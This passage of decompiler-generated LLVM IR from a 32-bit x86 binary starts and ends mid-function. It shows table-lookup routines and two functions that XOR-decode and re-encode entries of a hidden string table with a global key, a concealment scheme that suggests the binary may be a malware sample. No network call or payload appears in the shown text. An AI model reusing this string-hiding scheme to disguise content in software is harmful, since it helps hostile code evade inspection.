  %v2_804eb26 = call i16 @llvm.bswap.i16(i16 %v3_804eb20)
  %v3_804eb26 = zext i16 %v2_804eb26 to i32
  %v6_804eb26 = or i32 %v3_804eb26, %v6_804eb20
  store i32 %v6_804eb26, i32* %eax.global-to-local, align 4
  %v10_804eb2a = icmp eq i16 %v3_804eb20, 1024
  br i1 %v10_804eb2a, label %dec_label_pc_804eb43, label %dec_label_pc_804eb30

dec_label_pc_804eb30:                             ; preds = %dec_label_pc_804eb20, %dec_label_pc_804eb43
  %v0_804ea1d.pre = phi i32 [ %v0_804ea22127, %dec_label_pc_804eb20 ], [ %v0_804ea1d.pre.pre, %dec_label_pc_804eb43 ]
  %v0_804eb3b = phi i32 [ %v1_804ea74, %dec_label_pc_804eb20 ], [ %v0_804eb3b.pre, %dec_label_pc_804eb43 ]
  %v0_804eb30 = phi i32 [ %v7_804eb20, %dec_label_pc_804eb20 ], [ %v7_804eba7, %dec_label_pc_804eb43 ]
  %v1_804eb30 = trunc i32 %v0_804eb30 to i16
  %v2_804eb30 = call i16 @llvm.bswap.i16(i16 %v1_804eb30)
  %v3_804eb30 = zext i16 %v2_804eb30 to i32
  %v5_804eb30 = and i32 %v0_804eb30, -65536
  %v6_804eb30 = or i32 %v3_804eb30, %v5_804eb30
  store i32 %v6_804eb30, i32* %edx.global-to-local, align 4
  store i32 %v3_804eb30, i32* %eax.global-to-local, align 4
  %v2_804eb3b = add i32 %v3_804eb30, %v0_804eb3b
  br label %dec_label_pc_804ea1d.backedge

dec_label_pc_804eb43:                             ; preds = %dec_label_pc_804eb20
  %v2_804eb43 = inttoptr i32 %v1_804ea74 to i8*
  %v3_804eb43 = load i8, i8* %v2_804eb43, align 1
  %v4_804eb43 = zext i8 %v3_804eb43 to i32
  %v6_804eb43 = and i32 %v6_804eb26, -256
  %v7_804eb43 = or i32 %v4_804eb43, %v6_804eb43
  store i32 %v7_804eb43, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804eb48 = add i32 %v0_804ea22127, 4280
  %v4_804eb48 = inttoptr i32 %v3_804eb48 to i8*
  store i8 %v3_804eb43, i8* %v4_804eb48, align 1
  %v0_804eb4f = load i32, i32* @edi, align 4
  %v1_804eb4f = add i32 %v0_804eb4f, 1
  %v2_804eb4f = inttoptr i32 %v1_804eb4f to i8*
  %v3_804eb4f = load i8, i8* %v2_804eb4f, align 1
  %v4_804eb4f = zext i8 %v3_804eb4f to i32
  %v5_804eb4f = load i32, i32* %eax.global-to-local, align 4
  %v6_804eb4f = and i32 %v5_804eb4f, -256
  %v7_804eb4f = or i32 %v6_804eb4f, %v4_804eb4f
  store i32 %v7_804eb4f, i32* %eax.global-to-local, align 4
  %v2_804eb52 = load i32, i32* @esp, align 4
  %v3_804eb52 = add i32 %v2_804eb52, 4281
  %v4_804eb52 = inttoptr i32 %v3_804eb52 to i8*
  store i8 %v3_804eb4f, i8* %v4_804eb52, align 1
  %v0_804eb59 = load i32, i32* @edi, align 4
  %v1_804eb59 = add i32 %v0_804eb59, 2
  %v2_804eb59 = inttoptr i32 %v1_804eb59 to i8*
  %v3_804eb59 = load i8, i8* %v2_804eb59, align 1
  %v4_804eb59 = zext i8 %v3_804eb59 to i32
  %v5_804eb59 = load i32, i32* %eax.global-to-local, align 4
  %v6_804eb59 = and i32 %v5_804eb59, -256
  %v7_804eb59 = or i32 %v6_804eb59, %v4_804eb59
  store i32 %v7_804eb59, i32* %eax.global-to-local, align 4
  %v2_804eb5c = load i32, i32* @esp, align 4
  %v3_804eb5c = add i32 %v2_804eb5c, 4282
  %v4_804eb5c = inttoptr i32 %v3_804eb5c to i8*
  store i8 %v3_804eb59, i8* %v4_804eb5c, align 1
  %v0_804eb63 = load i32, i32* @edi, align 4
  %v1_804eb63 = add i32 %v0_804eb63, 3
  %v2_804eb63 = inttoptr i32 %v1_804eb63 to i8*
  %v3_804eb63 = load i8, i8* %v2_804eb63, align 1
  %v4_804eb63 = zext i8 %v3_804eb63 to i32
  %v5_804eb63 = load i32, i32* %eax.global-to-local, align 4
  %v6_804eb63 = and i32 %v5_804eb63, -256
  %v7_804eb63 = or i32 %v6_804eb63, %v4_804eb63
  store i32 %v7_804eb63, i32* %eax.global-to-local, align 4
  %v2_804eb66 = load i32, i32* @esp, align 4
  %v3_804eb66 = add i32 %v2_804eb66, 4283
  %v4_804eb66 = inttoptr i32 %v3_804eb66 to i8*
  store i8 %v3_804eb63, i8* %v4_804eb66, align 1
  %v0_804eb6d = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb6d = load i32, i32* @esp, align 4
  %v2_804eb6d = add i32 %v1_804eb6d, -4
  %v3_804eb6d = inttoptr i32 %v2_804eb6d to i32*
  store i32 %v0_804eb6d, i32* %v3_804eb6d, align 4
  %v0_804eb6e = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb6e = add i32 %v1_804eb6d, -8
  %v3_804eb6e = inttoptr i32 %v2_804eb6e to i32*
  store i32 %v0_804eb6e, i32* %v3_804eb6e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804eb71 = inttoptr i32 %v1_804eb6d to i32*
  %v3_804eb71 = load i32, i32* %v2_804eb71, align 4
  store i32 %v3_804eb71, i32* @edx, align 4
  %v1_804eb75 = inttoptr i32 %v3_804eb71 to i8*
  %v2_804eb75 = load i8, i8* %v1_804eb75, align 1
  %v3_804eb75 = zext i8 %v2_804eb75 to i32
  %v1_804eb77 = mul nuw nsw i32 %v3_804eb75, 4
  %v2_804eb77 = add nuw nsw i32 %v1_804eb77, 4
  store i32 %v2_804eb77, i32* %eax.global-to-local, align 4
  %v2_804eb7e = add i32 %v1_804eb6d, -12
  %v3_804eb7e = inttoptr i32 %v2_804eb7e to i32*
  store i32 %v2_804eb77, i32* %v3_804eb7e, align 4
  %v0_804eb7f = load i32, i32* @edx, align 4
  %v1_804eb7f = add i32 %v0_804eb7f, 4
  %v2_804eb7f = inttoptr i32 %v1_804eb7f to i32*
  %v3_804eb7f = load i32, i32* %v2_804eb7f, align 4
  store i32 %v3_804eb7f, i32* %eax.global-to-local, align 4
  %v2_804eb82 = add i32 %v1_804eb6d, -16
  %v3_804eb82 = inttoptr i32 %v2_804eb82 to i32*
  store i32 %v3_804eb7f, i32* %v3_804eb82, align 4
  %v0_804eb83 = call i32 @function_8050d4c()
  store i32 %v0_804eb83, i32* %eax.global-to-local, align 4
  %v0_804eb88 = load i32, i32* @esp, align 4
  %v1_804eb88 = add i32 %v0_804eb88, 16
  %v2_804eb88 = inttoptr i32 %v1_804eb88 to i32*
  %v3_804eb88 = load i32, i32* %v2_804eb88, align 4
  store i32 %v3_804eb88, i32* %ecx.global-to-local, align 4
  %v1_804eb8c = inttoptr i32 %v3_804eb88 to i8*
  %v2_804eb8c = load i8, i8* %v1_804eb8c, align 1
  %v3_804eb8c = zext i8 %v2_804eb8c to i32
  %v4_804eb8c = load i32, i32* @edx, align 4
  %v5_804eb8c = and i32 %v4_804eb8c, -256
  %v6_804eb8c = or i32 %v5_804eb8c, %v3_804eb8c
  store i32 %v6_804eb8c, i32* %edx.global-to-local, align 4
  %v2_804eb8e = add i32 %v3_804eb88, 4
  %v3_804eb8e = inttoptr i32 %v2_804eb8e to i32*
  store i32 %v0_804eb83, i32* %v3_804eb8e, align 4
  %v0_804eb91 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eb91 = urem i32 %v0_804eb91, 256
  %v2_804eb91 = load i32, i32* @ebx, align 4
  %v3_804eb91 = and i32 %v2_804eb91, -256
  %v4_804eb91 = or i32 %v3_804eb91, %v1_804eb91
  store i32 %v4_804eb91, i32* @ebx, align 4
  %v0_804eb93 = load i32, i32* @esp, align 4
  %v1_804eb93 = add i32 %v0_804eb93, 4296
  %v2_804eb93 = inttoptr i32 %v1_804eb93 to i32*
  %v3_804eb93 = load i32, i32* %v2_804eb93, align 4
  store i32 %v3_804eb93, i32* %ecx.global-to-local, align 4
  %v1_804eb9a = add i32 %v0_804eb91, 1
  store i32 %v1_804eb9a, i32* %edx.global-to-local, align 4
  %v3_804eb9b = mul i32 %v4_804eb91, 4
  %v4_804eb9b = add i32 %v3_804eb9b, %v0_804eb83
  %v5_804eb9b = inttoptr i32 %v4_804eb9b to i32*
  store i32 %v3_804eb93, i32* %v5_804eb9b, align 4
  %v0_804eb9e = load i32, i32* @esp, align 4
  %v1_804eb9e = add i32 %v0_804eb9e, 16
  %v2_804eb9e = inttoptr i32 %v1_804eb9e to i32*
  %v3_804eb9e = load i32, i32* %v2_804eb9e, align 4
  store i32 %v3_804eb9e, i32* %eax.global-to-local, align 4
  %v0_804eba5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eba5 = trunc i32 %v0_804eba5 to i8
  %v3_804eba5 = inttoptr i32 %v3_804eb9e to i8*
  store i8 %v1_804eba5, i8* %v3_804eba5, align 1
  %v0_804eba7 = load i32, i32* @esi, align 4
  %v1_804eba7 = add i32 %v0_804eba7, 8
  %v2_804eba7 = inttoptr i32 %v1_804eba7 to i16*
  %v3_804eba7 = load i16, i16* %v2_804eba7, align 2
  %v4_804eba7 = zext i16 %v3_804eba7 to i32
  %v5_804eba7 = load i32, i32* %edx.global-to-local, align 4
  %v6_804eba7 = and i32 %v5_804eba7, -65536
  %v7_804eba7 = or i32 %v6_804eba7, %v4_804eba7
  store i32 %v7_804eba7, i32* %edx.global-to-local, align 4
  %v0_804eb3b.pre = load i32, i32* @edi, align 4
  %v0_804ea1d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eb30

; uselistorder directives
  uselistorder i32 %v7_804eba7, { 1, 0 }
  uselistorder i32 %v0_804eb91, { 1, 0 }
  uselistorder i32 %v3_804eb30, { 0, 2, 1 }
  uselistorder i32 %v0_804eb30, { 1, 0 }
  uselistorder i32 %v6_804ea86, { 1, 0 }
  uselistorder i32 %v3_804eb0c, { 1, 0 }
  uselistorder i32 %v1_804eb08, { 1, 2, 0 }
  uselistorder i32 %v6_804ea33, { 2, 1, 0 }
  uselistorder i32 %v3_804eb00, { 1, 0 }
  uselistorder i32 %v1_804eafc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804ead6, { 1, 0 }
  uselistorder i32 %v0_804ea22, { 2, 1, 0 }
  uselistorder i32 %v6_804eab3, { 1, 0 }
  uselistorder i32 %v2_804eab1, { 1, 2, 0 }
  uselistorder i32 %v3_804eaa6, { 1, 0 }
  uselistorder i32 %v4_804ea86, { 1, 0, 2 }
  uselistorder i32 %v0_804eb09, { 2, 0, 1 }
  uselistorder i32 %v0_804eb0c, { 1, 0 }
  uselistorder i32 %v1_804ea74, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_804ea64, { 0, 2, 1 }
  uselistorder i32 %v2_804ea62, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804ea57, { 1, 0 }
  uselistorder i32 %v4_804ea33, { 1, 0, 2 }
  uselistorder i32 %v0_804eafd, { 2, 0, 1 }
  uselistorder i32 %v0_804eb00, { 1, 0 }
  uselistorder i32 %v6_804ea3316, { 1, 0, 2 }
  uselistorder i32 %v0_804ea2a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804ea22127, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804ea22122, { 0, 2, 1 }
  uselistorder i32 %v1_804e9f3, { 1, 0 }
  uselistorder i32 %v0_804e9ef, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804e9ea, { 1, 0, 2 }
  uselistorder i32 %v0_804e9bd, { 2, 0, 1, 3 }
  uselistorder i32 %v3_804e97e, { 1, 0 }
  uselistorder i32 %v0_804e92f, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v0_804e92a, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804e8f7, { 1, 0 }
  uselistorder i32 %v2_804e8f4, { 1, 0 }
  uselistorder i32 %v0_804e8f0, { 1, 0 }
  uselistorder i32 %v1_804e8dd, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804e8d1, { 1, 0 }
  uselistorder i32 %v0_804e8ce, { 2, 0, 1 }
  uselistorder i32 %v0_804e8b9, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804e897, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804e878, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v3_804e873, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e858, { 1, 0 }
  uselistorder i32 %v2_804e7df, { 1, 0 }
  uselistorder i32 %v1_804e7d1, { 1, 0 }
  uselistorder i32 %v1_804e773, { 1, 0 }
  uselistorder i8 %v2_804e762, { 2, 0, 3, 1 }
  uselistorder i32 %v0_804e75c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804e730, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 14, 2, 3, 13, 4, 5, 6, 7, 8, 10, 9, 11, 12 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 27, 16, 17, 18, 19, 20, 21, 22, 60, 24, 25, 26, 58, 59, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 (i32)* @function_8051700, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_804fd58, { 1, 0 }
  uselistorder i32 ()* @function_8050294, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_804f640, { 10, 9, 8, 7, 6, 2, 1, 0, 5, 4, 3 }
  uselistorder i32 (i32)* @function_804e440, { 3, 2, 1, 0 }
  uselistorder i32 (i8*)* @function_804f5b0, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 25, 26, 69, 21, 22, 70, 71, 72, 73, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 63, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 65, 0, 66, 67, 68 }
  uselistorder label %dec_label_pc_804eb30, { 1, 0 }
  uselistorder label %dec_label_pc_804ead6, { 1, 0 }
  uselistorder label %dec_label_pc_804ea1d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804ea8c, { 1, 0 }
  uselistorder label %dec_label_pc_804ea8c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ea39, { 1, 0 }
  uselistorder label %dec_label_pc_804ea39.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ea2a, { 1, 0 }
  uselistorder label %dec_label_pc_804e9b4, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e86c, { 1, 0 }
  uselistorder label %dec_label_pc_804e762, { 1, 0 }
}

define i32 @function_804ebb0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804ebb0:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* @ecx, align 4
  %v1_804ebb8 = icmp eq i32* %arg2, null
  %v1_804ebba = mul i32 %arg1, 8
  store i32 %v1_804ebba, i32* @edx, align 4
  br i1 %v1_804ebb8, label %dec_label_pc_804ebd3, label %dec_label_pc_804ebc9

dec_label_pc_804ebc9:                             ; preds = %dec_label_pc_804ebb0
  %v1_804ebc9 = add i32 %v1_804ebba, add (i32 ptrtoint (i32* @global_var_8053120.34 to i32), i32 4)
  %v2_804ebc9 = inttoptr i32 %v1_804ebc9 to i32*
  %v3_804ebc9 = load i32, i32* %v2_804ebc9, align 4
  %v1_804ebcc = urem i32 %v3_804ebc9, 65536
  store i32 %v1_804ebcc, i32* %arg2, align 4
  %v0_804ebd3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ebd3

dec_label_pc_804ebd3:                             ; preds = %dec_label_pc_804ebb0, %dec_label_pc_804ebc9
  %v0_804ebd3 = phi i32 [ %v1_804ebba, %dec_label_pc_804ebb0 ], [ %v0_804ebd3.pre, %dec_label_pc_804ebc9 ]
  %v1_804ebd3 = add i32 %v0_804ebd3, ptrtoint (i32* @global_var_8053120.34 to i32)
  %v2_804ebd3 = inttoptr i32 %v1_804ebd3 to i32*
  %v3_804ebd3 = load i32, i32* %v2_804ebd3, align 4
  ret i32 %v3_804ebd3

; uselistorder directives
  uselistorder label %dec_label_pc_804ebd3, { 1, 0 }
}

define i32 @function_804ebe0(i8 %arg1) local_unnamed_addr {
dec_label_pc_804ebe0:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_804ebe9 = zext i8 %arg1 to i32
  %v1_804ebed = mul nuw nsw i32 %v4_804ebe9, 8
  %v2_804ebed = add i32 %v1_804ebed, ptrtoint (i32* @global_var_8053120.34 to i32)
  store i32 %v2_804ebed, i32* @ecx, align 4
  %v0_804ebf4 = load i16, i16* @global_var_8053038.35, align 2
  %v1_804ebf4 = sext i16 %v0_804ebf4 to i32
  %v1_804ebf9 = add i32 %v1_804ebed, add (i32 ptrtoint (i32* @global_var_8053120.34 to i32), i32 4)
  %v2_804ebf9 = inttoptr i32 %v1_804ebf9 to i16*
  %v3_804ebf9 = load i16, i16* %v2_804ebf9, align 4
  %v4_804ebf9 = icmp eq i16 %v3_804ebf9, 0
  br i1 %v4_804ebf9, label %dec_label_pc_804ec4a, label %dec_label_pc_804ec00

dec_label_pc_804ec00:                             ; preds = %dec_label_pc_804ebe0
  store i32 %v1_804ebf4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_804ec08 = udiv i32 %v1_804ebf4, 16777216
  %v2_804ec0b = udiv i32 %v1_804ebf4, 256
  store i32 %v2_804ec0b, i32* %edi.global-to-local, align 4
  %v5_804ec0e = trunc i32 %v2_804ec08 to i8
  store i8 %v5_804ec0e, i8* %stack_var_-44, align 1
  %v2_804ec11 = udiv i32 %v1_804ebf4, 65536
  store i32 %v2_804ec11, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ec14

dec_label_pc_804ec14:                             ; preds = %dec_label_pc_804ec14.dec_label_pc_804ec14_crit_edge, %dec_label_pc_804ec00
  %v0_804ec1a = phi i32 [ %v0_804ec1a.pre, %dec_label_pc_804ec14.dec_label_pc_804ec14_crit_edge ], [ %v1_804ebf4, %dec_label_pc_804ec00 ]
  %v0_804ec16 = phi i32 [ %v1_804ec46, %dec_label_pc_804ec14.dec_label_pc_804ec14_crit_edge ], [ 0, %dec_label_pc_804ec00 ]
  %v0_804ec14 = phi i32 [ %v0_804ec3e, %dec_label_pc_804ec14.dec_label_pc_804ec14_crit_edge ], [ %v2_804ebed, %dec_label_pc_804ec00 ]
  %v1_804ec14 = inttoptr i32 %v0_804ec14 to i32*
  %v2_804ec14 = load i32, i32* %v1_804ec14, align 4
  %v2_804ec18 = add i32 %v2_804ec14, %v0_804ec16
  %v1_804ec1c = inttoptr i32 %v2_804ec18 to i8*
  %v2_804ec1c = load i8, i8* %v1_804ec1c, align 1
  %v4_804ec1c = trunc i32 %v0_804ec1a to i8
  %v5_804ec1c = xor i8 %v2_804ec1c, %v4_804ec1c
  store i8 %v5_804ec1c, i8* %v1_804ec1c, align 1
  %v0_804ec1e = load i32, i32* @edx, align 4
  %v0_804ec20 = load i32, i32* @ecx, align 4
  %v1_804ec20 = inttoptr i32 %v0_804ec20 to i32*
  %v2_804ec20 = load i32, i32* %v1_804ec20, align 4
  %v2_804ec22 = add i32 %v2_804ec20, %v0_804ec1e
  %v0_804ec24 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ec26 = inttoptr i32 %v2_804ec22 to i8*
  %v2_804ec26 = load i8, i8* %v1_804ec26, align 1
  %v4_804ec26 = trunc i32 %v0_804ec24 to i8
  %v5_804ec26 = xor i8 %v2_804ec26, %v4_804ec26
  store i8 %v5_804ec26, i8* %v1_804ec26, align 1
  %v0_804ec28 = load i32, i32* @edx, align 4
  %v0_804ec2a = load i32, i32* @ecx, align 4
  %v1_804ec2a = inttoptr i32 %v0_804ec2a to i32*
  %v2_804ec2a = load i32, i32* %v1_804ec2a, align 4
  %v2_804ec2c = add i32 %v2_804ec2a, %v0_804ec28
  %v0_804ec2e = load i32, i32* %esi.global-to-local, align 4
  %v1_804ec30 = inttoptr i32 %v2_804ec2c to i8*
  %v2_804ec30 = load i8, i8* %v1_804ec30, align 1
  %v4_804ec30 = trunc i32 %v0_804ec2e to i8
  %v5_804ec30 = xor i8 %v2_804ec30, %v4_804ec30
  store i8 %v5_804ec30, i8* %v1_804ec30, align 1
  %v0_804ec32 = load i32, i32* @edx, align 4
  %v0_804ec34 = load i32, i32* @ecx, align 4
  %v1_804ec34 = inttoptr i32 %v0_804ec34 to i32*
  %v2_804ec34 = load i32, i32* %v1_804ec34, align 4
  %v1_804ec36 = add i32 %v0_804ec32, 1
  store i32 %v1_804ec36, i32* @edx, align 4
  %v2_804ec37 = add i32 %v2_804ec34, %v0_804ec32
  %v2_804ec39 = load i8, i8* %stack_var_-44, align 1
  %v1_804ec3c = inttoptr i32 %v2_804ec37 to i8*
  %v2_804ec3c = load i8, i8* %v1_804ec3c, align 1
  %v5_804ec3c = xor i8 %v2_804ec3c, %v2_804ec39
  store i8 %v5_804ec3c, i8* %v1_804ec3c, align 1
  %v0_804ec3e = load i32, i32* @ecx, align 4
  %v1_804ec3e = add i32 %v0_804ec3e, 4
  %v2_804ec3e = inttoptr i32 %v1_804ec3e to i32*
  %v3_804ec3e = load i32, i32* %v2_804ec3e, align 4
  %v1_804ec41 = urem i32 %v3_804ec3e, 65536
  %v1_804ec46 = load i32, i32* @edx, align 4
  %v8_804ec48 = icmp sgt i32 %v1_804ec41, %v1_804ec46
  br i1 %v8_804ec48, label %dec_label_pc_804ec14.dec_label_pc_804ec14_crit_edge, label %dec_label_pc_804ec4a.loopexit

dec_label_pc_804ec14.dec_label_pc_804ec14_crit_edge: ; preds = %dec_label_pc_804ec14
  %v0_804ec1a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ec14

dec_label_pc_804ec4a.loopexit:                    ; preds = %dec_label_pc_804ec14
  br label %dec_label_pc_804ec4a

dec_label_pc_804ec4a:                             ; preds = %dec_label_pc_804ec4a.loopexit, %dec_label_pc_804ebe0
  %v0_804ec51 = phi i32 [ %v1_804ec41, %dec_label_pc_804ec4a.loopexit ], [ %v1_804ebf4, %dec_label_pc_804ebe0 ]
  ret i32 %v0_804ec51

; uselistorder directives
  uselistorder i32 %v1_804ec46, { 1, 0 }
  uselistorder i32 %v1_804ec41, { 1, 0 }
  uselistorder i32 %v0_804ec3e, { 1, 0 }
  uselistorder i32 %v1_804ebf4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_804ec60(i8 %arg1) local_unnamed_addr {
dec_label_pc_804ec60:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_804ec69 = zext i8 %arg1 to i32
  %v1_804ec6d = mul nuw nsw i32 %v4_804ec69, 8
  %v2_804ec6d = add i32 %v1_804ec6d, ptrtoint (i32* @global_var_8053120.34 to i32)
  store i32 %v2_804ec6d, i32* %ecx.global-to-local, align 4
  %v0_804ec74 = load i16, i16* @global_var_8053038.35, align 2
  %v1_804ec74 = sext i16 %v0_804ec74 to i32
  %v1_804ec79 = add i32 %v1_804ec6d, add (i32 ptrtoint (i32* @global_var_8053120.34 to i32), i32 4)
  %v2_804ec79 = inttoptr i32 %v1_804ec79 to i16*
  %v3_804ec79 = load i16, i16* %v2_804ec79, align 4
  %v4_804ec79 = icmp eq i16 %v3_804ec79, 0
  br i1 %v4_804ec79, label %dec_label_pc_804ecca, label %dec_label_pc_804ec80

dec_label_pc_804ec80:                             ; preds = %dec_label_pc_804ec60
  store i32 %v1_804ec74, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804ec88 = udiv i32 %v1_804ec74, 16777216
  %v2_804ec8b = udiv i32 %v1_804ec74, 256
  store i32 %v2_804ec8b, i32* %edi.global-to-local, align 4
  %v5_804ec8e = trunc i32 %v2_804ec88 to i8
  store i8 %v5_804ec8e, i8* %stack_var_-44, align 1
  %v2_804ec91 = udiv i32 %v1_804ec74, 65536
  store i32 %v2_804ec91, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ec94

dec_label_pc_804ec94:                             ; preds = %dec_label_pc_804ec94.dec_label_pc_804ec94_crit_edge, %dec_label_pc_804ec80
  %v0_804ec9a = phi i32 [ %v0_804ec9a.pre, %dec_label_pc_804ec94.dec_label_pc_804ec94_crit_edge ], [ %v1_804ec74, %dec_label_pc_804ec80 ]
  %v0_804ec96 = phi i32 [ %v1_804ecc6, %dec_label_pc_804ec94.dec_label_pc_804ec94_crit_edge ], [ 0, %dec_label_pc_804ec80 ]
  %v0_804ec94 = phi i32 [ %v0_804ecbe, %dec_label_pc_804ec94.dec_label_pc_804ec94_crit_edge ], [ %v2_804ec6d, %dec_label_pc_804ec80 ]
  %v1_804ec94 = inttoptr i32 %v0_804ec94 to i32*
  %v2_804ec94 = load i32, i32* %v1_804ec94, align 4
  %v2_804ec98 = add i32 %v2_804ec94, %v0_804ec96
  %v1_804ec9c = inttoptr i32 %v2_804ec98 to i8*
  %v2_804ec9c = load i8, i8* %v1_804ec9c, align 1
  %v4_804ec9c = trunc i32 %v0_804ec9a to i8
  %v5_804ec9c = xor i8 %v2_804ec9c, %v4_804ec9c
  store i8 %v5_804ec9c, i8* %v1_804ec9c, align 1
  %v0_804ec9e = load i32, i32* %edx.global-to-local, align 4
  %v0_804eca0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804eca0 = inttoptr i32 %v0_804eca0 to i32*
  %v2_804eca0 = load i32, i32* %v1_804eca0, align 4
  %v2_804eca2 = add i32 %v2_804eca0, %v0_804ec9e
  %v0_804eca4 = load i32, i32* %edi.global-to-local, align 4
  %v1_804eca6 = inttoptr i32 %v2_804eca2 to i8*
  %v2_804eca6 = load i8, i8* %v1_804eca6, align 1
  %v4_804eca6 = trunc i32 %v0_804eca4 to i8
  %v5_804eca6 = xor i8 %v2_804eca6, %v4_804eca6
  store i8 %v5_804eca6, i8* %v1_804eca6, align 1
  %v0_804eca8 = load i32, i32* %edx.global-to-local, align 4
  %v0_804ecaa = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ecaa = inttoptr i32 %v0_804ecaa to i32*
  %v2_804ecaa = load i32, i32* %v1_804ecaa, align 4
  %v2_804ecac = add i32 %v2_804ecaa, %v0_804eca8
  %v0_804ecae = load i32, i32* %esi.global-to-local, align 4
  %v1_804ecb0 = inttoptr i32 %v2_804ecac to i8*
  %v2_804ecb0 = load i8, i8* %v1_804ecb0, align 1
  %v4_804ecb0 = trunc i32 %v0_804ecae to i8
  %v5_804ecb0 = xor i8 %v2_804ecb0, %v4_804ecb0
  store i8 %v5_804ecb0, i8* %v1_804ecb0, align 1
  %v0_804ecb2 = load i32, i32* %edx.global-to-local, align 4
  %v0_804ecb4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ecb4 = inttoptr i32 %v0_804ecb4 to i32*
  %v2_804ecb4 = load i32, i32* %v1_804ecb4, align 4
  %v1_804ecb6 = add i32 %v0_804ecb2, 1
  store i32 %v1_804ecb6, i32* %edx.global-to-local, align 4
  %v2_804ecb7 = add i32 %v2_804ecb4, %v0_804ecb2
  %v2_804ecb9 = load i8, i8* %stack_var_-44, align 1
  %v1_804ecbc = inttoptr i32 %v2_804ecb7 to i8*
  %v2_804ecbc = load i8, i8* %v1_804ecbc, align 1
  %v5_804ecbc = xor i8 %v2_804ecbc, %v2_804ecb9
  store i8 %v5_804ecbc, i8* %v1_804ecbc, align 1
  %v0_804ecbe = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ecbe = add i32 %v0_804ecbe, 4
  %v2_804ecbe = inttoptr i32 %v1_804ecbe to i32*
  %v3_804ecbe = load i32, i32* %v2_804ecbe, align 4
  %v1_804ecc1 = urem i32 %v3_804ecbe, 65536
  %v1_804ecc6 = load i32, i32* %edx.global-to-local, align 4
  %v8_804ecc8 = icmp sgt i32 %v1_804ecc1, %v1_804ecc6
  br i1 %v8_804ecc8, label %dec_label_pc_804ec94.dec_label_pc_804ec94_crit_edge, label %dec_label_pc_804ecca.loopexit

dec_label_pc_804ec94.dec_label_pc_804ec94_crit_edge: ; preds = %dec_label_pc_804ec94
  %v0_804ec9a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ec94

dec_label_pc_804ecca.loopexit:                    ; preds = %dec_label_pc_804ec94
  br label %dec_label_pc_804ecca

dec_label_pc_804ecca:                             ; preds = %dec_label_pc_804ecca.loopexit, %dec_label_pc_804ec60
  %v0_804ecd1 = phi i32 [ %v1_804ecc1, %dec_label_pc_804ecca.loopexit ], [ %v1_804ec74, %dec_label_pc_804ec60 ]
